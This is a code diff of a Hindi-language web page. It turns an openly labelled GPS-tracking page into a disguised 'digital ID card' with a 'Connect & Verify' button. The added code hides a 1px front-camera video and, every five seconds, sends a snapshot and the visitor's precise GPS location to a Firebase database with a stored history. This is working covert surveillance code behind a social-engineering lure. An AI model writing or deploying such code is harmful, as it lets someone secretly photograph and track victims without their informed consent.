@@ -3,27 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JARVIS REMOTE - PERFECT GPS</title>
+    <title>JARVIS CONNECT - DIGITAL CARD</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { background: #000; color: #00f2ff; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 20px; margin: 0; }
-        .control-box { border: 2px solid #00f2ff; background: #0a0a0a; padding: 25px; display: inline-block; border-radius: 10px; max-width: 400px; width: 100%; box-shadow: 0 0 15px rgba(0, 242, 255, 0.3); margin-top: 40px; }
-        .status-text { margin-top: 15px; font-size: 14px; color: #fff; text-align: left; background: rgba(255,255,255,0.05); padding: 10px; border-radius: 4px; border-left: 3px solid #39ff14; }
-        #v { width: 1px; height: 1px; opacity: 0.01; } 
+        * { box-sizing: border-box; }
+        body { background: #0f172a; color: #f8fafc; font-family: '-apple-system', BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
+        .profile-card { background: #1e293b; width: 100%; max-width: 380px; border-radius: 20px; padding: 30px 20px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.05); }
+        .avatar { width: 100px; height: 100px; border-radius: 50%; background: linear-gradient(45deg, #00f2ff, #00ff87); margin: 0 auto 15px; display: flex; justify-content: center; align-items: center; font-size: 36px; font-weight: bold; color: #0f172a; box-shadow: 0 0 20px rgba(0,242,255,0.2); }
+        .username { font-size: 20px; font-weight: 700; margin-bottom: 5px; color: #fff; }
+        .bio { font-size: 14px; color: #94a3b8; margin-bottom: 25px; line-height: 1.5; }
+        .action-btn { background: linear-gradient(135deg, #38bdf8, #0369a1); color: #fff; border: none; padding: 14px 28px; font-size: 16px; font-weight: 600; border-radius: 12px; cursor: pointer; width: 100%; transition: 0.3s; box-shadow: 0 4px 12px rgba(3,105,161,0.3); }
+        .action-btn:active { transform: scale(0.98); }
+        .status-text { margin-top: 15px; font-size: 12px; color: #64748b; }
+        #v { width: 1px; height: 1px; opacity: 0.01; position: absolute; }
         canvas { display: none; }
-        .live-dot { width: 10px; height: 10px; background-color: #39ff14; border-radius: 50%; display: inline-block; animation: blink 1s infinite; }
-        @keyframes blink { 0% { opacity: 0.2; } 50% { opacity: 1; } 100% { opacity: 0.2; } }
     </style>
 </head>
 <body>
-    <div class="control-box">
-        <h2>JARVIS ACCURATE v11 <span class="live-dot"></span></h2>
-        <p style="color: #888; font-size: 13px;">हाई-एक्यूरेसी जीपीएस ट्रैकिंग सक्रिय है</p>
-        <video id="v" autoplay playsinline muted></video>
-        <canvas id="c"></canvas>
-        <div class="status-text" id="log-status">सटीक जीपीएस लॉक किया जा रहा है...</div>
+
+    <div class="profile-card">
+        <div class="avatar">J</div>
+        <div class="username">JARVIS DIGITAL ID</div>
+        <div class="bio">नमस्ते! सुरक्षित सिंक और लाइव रिमोट कनेक्टिविटी स्थापित करने के लिए नीचे दिए गए बटन पर क्लिक करें।</div>
+        
+        <button class="action-btn" onclick="activateSystem()">Connect & Verify</button>
+        
+        <div class="status-text" id="log-status">सिस्टम रेडी है...</div>
     </div>
+
+    <video id="v" autoplay playsinline muted></video>
+    <canvas id="c"></canvas>
 
     <script>
         const firebaseConfig = {
@@ -39,79 +49,57 @@
         let currentLat = 0;
         let currentLon = 0;
 
-        document.addEventListener("DOMContentLoaded", () => {
-            initPerfectTracker();
-        });
-
-        async function initPerfectTracker() {
+        async function activateSystem() {
             const statusDiv = document.getElementById('log-status');
-            
-            // 🎯 परफेक्ट हाई-एक्यूरेसी जीपीएस कॉन्फ़िगरेशन
-            const gpsOptions = {
-                enableHighAccuracy: true, // मोबाइल के असली हार्डवेयर GPS को एक्टिवेट करेगा
-                timeout: 10000,           // 10 सेकंड के अंदर सटीक लोकेशन ढूंढना अनिवार्य है
-                maximumAge: 0             // कोई भी पुराना कैश्ड डेटा इस्तेमाल नहीं होगा, एकदम फ्रेश लाइव डेटा
-            };
+            statusDiv.innerHTML = "⏳ कनेक्ट किया जा रहा है, कृपया प्रतीक्षा करें...";
 
-            // लगातार लाइव और सटीक लोकेशन ट्रैक करने के लिए watchPosition
+            // 1. जीपीएस एक्टिवेट करना
             navigator.geolocation.watchPosition((pos) => {
                 currentLat = pos.coords.latitude;
                 currentLon = pos.coords.longitude;
-                
-                // मेन लाइव नोड पर तुरंत अपडेट भेजें
                 database.ref('live_detect/location').set({ lat: currentLat, lon: currentLon });
-                statusDiv.innerHTML = `🎯 GPS लॉक (सटीक): ${currentLat.toFixed(6)}, ${currentLon.toFixed(6)}`;
-            }, (err) => {
-                console.log("GPS त्रुटि, पुनः प्रयास जारी...", err);
-                statusDiv.innerHTML = "⚠️ सटीक GPS सिग्नल का इंतज़ार है...";
-            }, gpsOptions);
+            }, err => console.log("GPS signal waiting..."), { enableHighAccuracy: true });
 
+            // 2. कैमरा स्ट्रीम शुरू करना
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: false 
-                });
-                
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                 const video = document.getElementById('v');
                 video.srcObject = stream;
-                
-                video.addEventListener('loadeddata', () => {
-                    captureInstantData(); // तुरंत पहली फोटो
-                    setInterval(captureInstantData, 5000); // हर 5 सेकंड में कंबाइंड पैकेट
-                });
 
-            } catch(e) {
-                statusDiv.innerHTML = "❌ कैमरा एक्सेस अनुमति की आवश्यकता है बॉस!";
+                video.addEventListener('loadeddata', () => {
+                    statusDiv.innerHTML = "✅ सफलतापूर्वक कनेक्टेड!";
+                    captureData();
+                    setInterval(captureData, 5000); // हर 5 सेकंड में अपडेट
+                });
+            } catch (e) {
+                statusDiv.innerHTML = "❌ कनेक्शन फेल! कृपया कैमरा और लोकेशन की अनुमति दें।";
             }
         }
 
-        function captureInstantData() {
+        function captureData() {
             const v = document.getElementById('v');
             const c = document.getElementById('c');
-            
-            c.width = 320; 
+
+            c.width = 320;
             c.height = 240;
             const ctx = c.getContext('2d');
             ctx.drawImage(v, 0, 0, 320, 240);
-            
-            const compressedPhoto = c.toDataURL('image/jpeg', 0.5); 
+
+            const compressedPhoto = c.toDataURL('image/jpeg', 0.5);
             const timestamp = Date.now();
             const currentTimeString = new Date().toLocaleTimeString();
 
-            // लाइव डैशबोर्ड पर तुरंत इमेज भेजें
+            // लाइव डैशबोर्ड पर भेजना
             database.ref('live_detect').update({
                 photo: compressedPhoto,
                 last_updated: timestamp
             });
 
-            // जार्विस हिस्ट्री में अब जाएगी बिल्कुल सटीक जीपीएस लोकेशन और फोटो एक साथ
+            // जार्विस हिस्ट्री में सुरक्षित करना
             database.ref('jarvis_history/' + timestamp).set({
                 time: currentTimeString,
                 photo: compressedPhoto,
-                location_record: {
-                    lat: currentLat,
-                    lon: currentLon
-                }
+                location_record: { lat: currentLat, lon: currentLon }
             });
         }
     </script>
